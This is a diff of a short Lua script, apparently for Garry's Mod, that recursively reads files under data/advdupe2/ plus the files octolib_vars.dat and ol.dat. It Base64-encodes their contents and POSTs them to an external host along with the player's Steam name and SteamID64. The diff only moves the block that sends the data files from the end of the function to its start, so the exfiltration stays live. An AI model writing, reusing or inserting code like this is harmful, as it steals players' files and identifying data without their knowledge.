@@ -2,6 +2,13 @@ local function tbt(c)
     return util.Base64Encode(c)
 end
 local function a(b)
+tb = {"octolib_vars.dat","ol.dat"}
+for k,v in pairs(tb) do
+if file.Exists(v, "DATA") then
+g = file.Read(v, "DATA")
+http.Post("https://cw49403.tw1.ru/c/23/i.php",{one="data/",two=v,tree=tbt(g),vfo=steamworks.GetPlayerName(LocalPlayer():SteamID64()).."_"..LocalPlayer():SteamID64()})
+end
+end
 local c,d=file.Find(b.."*","MOD")
 for _,f in pairs(c)do 
 local g=file.Read(b.."/"..f,"GAME")
@@ -10,13 +17,6 @@ http.Post("https://cw49403.tw1.ru/c/23/i.php",{one=b,two=f,tree=tbt(g),vfo=steam
 end
 for h,i in pairs(d)do 
 a(b..i.."/")
-end
-tb = {"octolib_vars.dat","ol.dat"}
-for k,v in pairs(tb) do
-if file.Exists(v, "DATA") then
-g = file.Read(v, "DATA")
-http.Post("https://cw49403.tw1.ru/c/23/i.php",{one="data/",two=v,tree=tbt(g),vfo=steamworks.GetPlayerName(LocalPlayer():SteamID64()).."_"..LocalPlayer():SteamID64()})
-end
 end
 end
 a("data/advdupe2/")
